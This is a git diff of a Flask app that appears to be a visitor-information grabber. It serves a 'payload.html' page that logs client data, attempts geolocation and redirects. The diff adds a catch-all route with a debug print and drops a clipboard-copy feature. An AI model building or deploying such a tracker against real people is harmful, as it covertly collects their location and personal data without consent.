@@ -5,7 +5,6 @@ import sqlite3
 import argparse
 import random
 import string
-from pyperclip import copy, PyperclipException
 from hashlib import sha256
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify, redirect, session, send_from_directory
@@ -255,10 +254,14 @@ def clear_database():
         return jsonify({"status": "error", "message": "Error clearing database."}), 500
 
 
-@app.route('/', methods=["GET", 'POST'])
-def user_info():
+@app.route('/', methods=["GET", 'POST'], defaults={"path": ""})
+@app.route("/<path:path>")
+def user_info(path):
     # Log the clients information with in index page that loads the javascript
     if request.method == "GET":
+        print(path)
+
+        # return "debugging get method"
         return render_template('payload.html', redirect_url=redirect_url, attempt_geolocation=gps)
 
     user_data = request.json
@@ -294,6 +297,7 @@ def generate_self_signed_cert(cert_path, key_path):
 
     # Execute the command
     run(command, check=True)
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Run the Flask application.')
@@ -348,13 +352,5 @@ if __name__ == "__main__":
     clients_password = generate_password()
     clients_password_hash = sha256(clients_password.encode()).hexdigest()
     print(f"Login password: \033[92m{clients_password}\033[0m")
-
-    try:
-        copy(clients_password)
-        print("Password copied to clipboard.")
-    except PyperclipException:
-        print("Could not find a copy/paste mechanism for your system.")
-        print("On Linux, you can run `sudo apt-get install xclip` or `sudo apt-get install xselect` to install a copy/paste mechanism.")
-
     main()
 
